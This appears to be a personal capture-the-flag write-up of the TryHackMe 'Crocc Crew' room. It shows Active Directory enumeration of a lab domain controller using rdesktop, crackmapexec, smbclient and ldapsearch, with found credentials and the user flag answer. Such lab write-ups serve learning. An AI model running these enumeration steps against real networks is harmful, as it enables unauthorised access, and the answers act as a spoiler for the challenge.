<p align="center">April 30, 2025<br>
Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{359}}$$-day-streak in  <a href="https://tryhackme.com">TryHackMe</a>.<br><br>
<img width="300px" src="h" alt="Your Image Badge"><br>
<img width="200px" src="https://github.com/user-attachments/assets/20b25a8f-4077-45ff-8093-d62f63b8e143"><br></p>
<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Crocc Crew}}$$</h1>
<p align="center"><em>Crocc Crew has created a backdoor on a Cooctus Corp Domain Controller. We're calling in the experts to find the real back door!</em>!<br>
It is classified as an insane-level CTF.<br>
You can join it for 🆓 using your own virtual machine with openVPN or TryHackMe´s AttackBox if you are subscribed.<br>
Can be accessed clicking  <a href="https://tryhackme.com/room/chrome">here</a>.</p>

<p align="center"> <img width="1000px" src=""> </p>

<br>
<br>

<h2>Task 1 . Get Connected!</h2>

![image](https://github.com/user-attachments/assets/4c9e3508-5673-46aa-b1ce-6573ba9ae1c4)


<p>[ ... ]</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>


> 1.1. <em>You're now ready to start hacking! </em><br><a id='1.1'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

> 1.2. <em>Alternatively, you can deploy the In-Browser Kali or Attack Box and automatically be connected to the TryHackMe Network.</em><br><a id='1.2'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>

> 1.3. <em>Once connected to the VPN, deploy the machine and get hacking!</em><br><a id='1.3'></a>
>> <strong><code>No answer needed</code></strong><br>
<p></p>

<br>
<br>

<h2>Task 2. Hack Back!</h2>

<p>[ ... ]</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>

> 2.1. <em>What is the User flag?</em><br><a id='2.1'></a>
>> <strong><code>THM{Gu3st_Pl3as3}</code></strong><br>
<p></p>

<p>- Navigated to <code>http://TargetIP/robots.txt</code>.</p>

```bash
User-Agent: *
Disallow:
/robots.txt
/db-config.bak
/backdoor.php
```

<br>

<p>- Navigated to <code>http://TargetIP/backdoor.php</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/b0e6d04f-c184-47fc-9d2a-68c26a926c4e)

<br>

<p>- Viewed <code>Page Source</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/ce56a028-9da1-4ba0-b3ad-aced96362719)


<br>

<p>- Navigated to <code>http://TargetIP/db-config.back</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/3fdb3eaf-aed8-4707-929b-f08cc0f58fc3)


<br>

<p>- Installed and used <code>rdesktop</code>.</p>

<br>

```bash
:~/CroccCrew# apt install rdesktop
...
:~/CroccCrew# rdesktop -f -u "" TargetIP
...
yes
...
```


<br>

<p>- Discovered <code>Visitor</code>:<code>GuestLogin!</code>.</p>

<br>

![image](https://github.com/user-attachments/assets/7ef9d2ea-eebf-469f-84ee-cbfac25d7243)

<br>


![image](https://github.com/user-attachments/assets/8e57ab5f-78fd-4c98-bd73-990a82a06a35)


<br>

![image](https://github.com/user-attachments/assets/b5184ce2-b948-44e9-a51e-c588f5a00ec4)

<br>

<p>- Installed and used <code>crackmapexec</code> with the credentials <code>Visitor</code>:<code>GuestLogin!</code>.<br><br>
- Discovered <code>domain</code> : <code>COOCTUS.CORP</code>.</p>

```bash
:~/CroccCrew# snap install crackmapexec
...
:~/CroccCrew# # crackmapexec smb 10.10.130.42 -u Visitor -p GuestLogin!
SMB         10.10.130.42    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
SMB         10.10.130.42    445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin! 
:~/CroccCrew# 
```

<br>

<p>- Installed and used <code>smbclient</code> with the credentials <code>Visitor</code>:<code>GuestLogin!</code>.<br><br>
- Discovered the sharenames.<</p>br><br>
- <code>Home</code> caught my attention.</p>

<br>

```bash
~/CroccCrew# smbclient -L //TargetIP -U "Visitor"
Password for [WORKGROUP\Visitor]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	Home            Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
:~/CroccCrew#
:~/CroccCrew# smbclient //TargetIP/Home -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 20:42:53 2021
  ..                                  D        0  Tue Jun  8 20:42:53 2021
  user.txt                            A       17  Tue Jun  8 04:14:25 2021

		15587583 blocks of size 4096. 11430698 blocks available
smb: \> more user.txt
getting file \user.txt of size 17 as /tmp/smbmore.CQgSzr (1.7 KiloBytes/sec) (average 1.7 KiloBytes/sec)
...
THM{Gu3st_Pl3as3}
```

<br>




> 2.2. <em>What is the name of the account Crocc Crew planted?</em><br><a id='2.2'></a>
>> <strong><code>____</code></strong><br>
<p></p>

<br>

```bash
:~/CroccCrew# smbclient //10.10.130.42/SYSVOL -U "Visitor"
Password for [WORKGROUP\Visitor]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jun  8 01:34:33 2021
  ..                                  D        0  Tue Jun  8 01:34:33 2021
  COOCTUS.CORP                       Dr        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429391 blocks available
smb: \> cd COOCTUS.CORP\
smb: \COOCTUS.CORP\> ls
  .                                   D        0  Tue Jun  8 01:40:32 2021
  ..                                  D        0  Tue Jun  8 01:40:32 2021
  DfsrPrivate                      DHSr        0  Tue Jun  8 01:40:32 2021
  Policies                            D        0  Tue Jun  8 01:34:38 2021
  scripts                             D        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429386 blocks available
smb: \COOCTUS.CORP\> cd DfsPrivate\
cd \COOCTUS.CORP\DfsPrivate\: NT_STATUS_OBJECT_NAME_NOT_FOUND
smb: \COOCTUS.CORP\> cd Policies\
smb: \COOCTUS.CORP\Policies\> ls
  .                                   D        0  Tue Jun  8 01:34:38 2021
  ..                                  D        0  Tue Jun  8 01:34:38 2021
  {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Tue Jun  8 01:34:38 2021
  {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Tue Jun  8 01:34:38 2021

		15587583 blocks of size 4096. 11429437 blocks available
smb: \COOCTUS.CORP\Policies\> cd ..
smb: \COOCTUS.CORP\> cd scripts\
smb: \COOCTUS.CORP\scripts\> ls
  .                                   D        0  Tue Jun  8 01:34:33 2021
  ..                                  D        0  Tue Jun  8 01:34:33 2021

		15587583 blocks of size 4096. 11429437 blocks available
smb: \COOCTUS.CORP\scripts\> 
```



<br>

<p>Used <code>ldapsearch</code>.</p>

<br>

```bash
:~/CroccCrew# ldapsearch -h
...
usage: ldapsearch [options] [filter [attributes...]]
where:
  filter	RFC 4515 compliant LDAP search filter
  attributes	whitespace-separated list of attribute descriptions
    which may include:
      1.1   no attributes
      *     all user attributes
      +     all operational attributes
Search options:
...

-s scope   one of base, one, sub or children (search scope)

...
-x         Simple authentication

...
:~/CroccCrew# ldapsearch -x -s base namingcontexts -H ldap://TargetIP
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingcontexts: DC=COOCTUS,DC=CORP
namingcontexts: CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
namingcontexts: DC=DomainDnsZones,DC=COOCTUS,DC=CORP
namingcontexts: DC=ForestDnsZones,DC=COOCTUS,DC=CORP

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
:~/CroccCrew# 
```


<br>

<p>Used <code>ldapsearch</code>.</p>

<br>


```bash
:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -H ldap://TargetIP
# extended LDIF
#
# LDAPv3
# base <DC=COOCTUS,DC=CORP> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4563

# numResponses: 1
:~/CroccCrew#
```

<br>

<p>Used <code>ldapsearch</code> to generated <code>lpad_report.txt</code>.</p>

<br>

```bash
:~/CroccCrew# ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -H ldap://10.10.130.42 -W > ldap_report.txt
Enter LDAP Password: 
```

<br>

<p><code>ldap_report.txt</code> content is huge!!!<br><br>
Following its content filtered.</p>

<br>

```bash
...
# admCroccCrew, Enterprise-Admins, Security-OU, COOCTUS.CORP
dn: CN=admCroccCrew,OU=Enterprise-Admins,OU=Security-OU,DC=COOCTUS,DC=CORP
...
cn: admCroccCrew
givenName: admCroccCrew
...
displayName: admCroccCrew
...
name: admCroccCrew
objectGUID:: ej4EyTrxQECq9t62o8ROGg==
userAccountControl: 66048
...
badPasswordTime: 132676033890368878
lastLogoff: 0
lastLogon: 132676033917094150
pwdLastSet: 132676009478796916
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAJqvqeuD7CtfhfJd7YQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 1
sAMAccountName: admCroccCrew
sAMAccountType: 805306368
userPrincipalName: admCroccCrew@COOCTUS.CORP
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=COOCTUS,DC=CORP
dSCorePropagationData: 20210608191453.0Z
dSCorePropagationData: 20210608185942.0Z
dSCorePropagationData: 20210608185055.0Z
dSCorePropagationData: 20210608062014.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 132676009766264244
...
```

<br>




<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{Room Completed}}$$</h1>
<br>
<p align="center">
<img width="1000px" src="https://github.com/user-attachments/assets/50177c62-4916-409b-b10a-9e5a479ed3d4"><br>
<img width="1000px" src="https://github.com/user-attachments/assets/c3599785-514b-4142-848e-dd259765badd"></p>


<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{My TryHackMe Journey}}$$ </h1>
<br>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| April 30, 2025    | 359      |     245ᵗʰ    |      6ᵗʰ     |     54ᵗʰ   |     2ⁿᵈ    |  98,687  |    697    |     60    |

</div>

<br>

<p align="center"> Global All Time:  245ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/0c414a78-1bdc-411e-8268-41cdc0257f4e"> </p>

<p align="center"> Brazil All Time:    6ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/f2370644-b337-4557-9a1f-2f119d7b5eb9"> </p>

<p align="center"> Global monthly:    54ᵗʰ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/a198bf71-3853-4e6e-ac82-625c953551d0"> </p>

<p align="center"> Brazil monthly:    2ⁿᵈ<br><br><img width="1000px" src="https://github.com/user-attachments/assets/ed8d3f14-f15f-4f5d-b618-e57c429205c7"> </p>

<br>
<br>


<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thanks for coming!!!}}$$</h1>

<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p> 

<br>

<h1 align="center">$$\textcolor{#3bd62d}{\textnormal{Thank you}}$$</h1>
<p align="center"><a href="https://tryhackme.com/p/tryhackme">tryhackme</a> and <a https://tryhackme.com/p/hadrian3689">hadrian3689</a> for investing your time and effort to develop this challenge so that I could sharpen my skills!</p> 
